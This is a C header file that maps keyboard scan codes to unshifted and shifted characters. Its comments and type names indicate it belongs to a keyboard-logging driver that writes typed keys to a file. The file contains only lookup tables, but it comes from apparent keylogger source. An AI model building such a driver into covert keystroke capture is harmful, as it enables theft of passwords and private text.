#ifndef __ScanCode_h__ 
#define __ScanCode_h__ 


////////////////////////////////////////////////////////////////////////////   
// SCAN CODE MAP - For the purposes of this driver, the only keys    
// that will be logged are the alphabetical keys, the numeric keys,    
// and the special characters (ie. #,$,%,ect). Keys like, "ENTER",   
// "SHIFT", "ESC", ect will filtered out and not be logged out to the file.   
////////////////////////////////////////////////////////////////////////////   
#define INVALID 0X00 //scan code not supported by this driver   
#define SPACE 0X01 //space bar   
#define ENTER 0X02 //enter key   
#define LSHIFT 0x03 //left shift key   
#define RSHIFT 0x04 //right shift key   
#define CTRL  0x05 //control key   
#define ALT   0x06 //alt key   

#define KEY_MAKE  0
#define KEY_BREAK 1
#define SP_KEY_MAKE  2
#define SP_KEY_BREAK 3

char KeyMap[84] = {
	INVALID, //0   
	INVALID, //1   
	'1', //2   
	'2', //3   
	'3', //4   
	'4', //5   
	'5', //6   
	'6', //7   
	'7', //8   
	'8', //9   
	'9', //A   
	'0', //B   
	'-', //C   
	'=', //D   
	INVALID, //E   
	INVALID, //F   
	'q', //10   
	'w', //11   
	'e', //12   
	'r', //13   
	't', //14   
	'y', //15   
	'u', //16   
	'i', //17   
	'o', //18   
	'p', //19   
	'[', //1A   
	']', //1B   
	ENTER, //1C   
	CTRL, //1D   
	'a', //1E   
	's', //1F   
	'd', //20   
	'f', //21   
	'g', //22   
	'h', //23   
	'j', //24   
	'k', //25   
	'l', //26   
	';', //27   
	'\'', //28   
	'`', //29   
	LSHIFT, //2A   
	'\\', //2B   
	'z', //2C   
	'x', //2D   
	'c', //2E   
	'v', //2F   
	'b', //30   
	'n', //31   
	'm', //32   
	',', //33   
	'.', //34   
	'/', //35   
	RSHIFT, //36   
	INVALID, //37   
	ALT, //38   
	SPACE, //39   
	INVALID, //3A   
	INVALID, //3B   
	INVALID, //3C   
	INVALID, //3D   
	INVALID, //3E   
	INVALID, //3F   
	INVALID, //40   
	INVALID, //41   
	INVALID, //42   
	INVALID, //43   
	INVALID, //44   
	INVALID, //45   
	INVALID, //46   
	'7', //47   
	'8', //48   
	'9', //49   
	INVALID, //4A   
	'4', //4B   
	'5', //4C   
	'6', //4D   
	INVALID, //4E   
	'1', //4F   
	'2', //50   
	'3', //51   
	'0', //52   
};

///////////////////////////////////////////////////////////////////////   
//The Extended Key Map is used for those scan codes that can map to   
//more than one key.  This mapping is usually determined by the    
//states of other keys (ie. the shift must be pressed down with a letter   
//to make it uppercase).   
///////////////////////////////////////////////////////////////////////   
char ExtendedKeyMap[84] = {
	INVALID, //0   
	INVALID, //1   
	'!', //2   
	'@', //3   
	'#', //4   
	'$', //5   
	'%', //6   
	'^', //7   
	'&', //8   
	'*', //9   
	'(', //A   
	')', //B   
	'_', //C   
	'+', //D   
	INVALID, //E   
	INVALID, //F   
	'Q', //10   
	'W', //11   
	'E', //12   
	'R', //13   
	'T', //14   
	'Y', //15   
	'U', //16   
	'I', //17   
	'O', //18   
	'P', //19   
	'{', //1A   
	'}', //1B   
	ENTER, //1C   
	INVALID, //1D   
	'A', //1E   
	'S', //1F   
	'D', //20   
	'F', //21   
	'G', //22   
	'H', //23   
	'J', //24   
	'K', //25   
	'L', //26   
	':', //27   
	'"', //28   
	'~', //29   
	LSHIFT, //2A   
	'|', //2B   
	'Z', //2C   
	'X', //2D   
	'C', //2E   
	'V', //2F   
	'B', //30   
	'N', //31   
	'M', //32   
	'<', //33   
	'>', //34   
	'?', //35   
	RSHIFT, //36   
	INVALID, //37   
	INVALID, //38   
	SPACE, //39   
	INVALID, //3A   
	INVALID, //3B   
	INVALID, //3C   
	INVALID, //3D   
	INVALID, //3E   
	INVALID, //3F   
	INVALID, //40   
	INVALID, //41   
	INVALID, //42   
	INVALID, //43   
	INVALID, //44   
	INVALID, //45   
	INVALID, //46   
	'7', //47   
	'8', //48   
	'9', //49   
	INVALID, //4A   
	'4', //4B   
	'5', //4C   
	'6', //4D   
	INVALID, //4E   
	'1', //4F   
	'2', //50   
	'3', //51   
	'0', //52   
};

//////////////////////// 
// PROTOTYPES 
////////////////////////// 
//void ConvertScanCodeToKeyCode(PKLOG_DEVICE_EXTENSION pDevExt, KEY_DATA* kData, char* keys);

#endif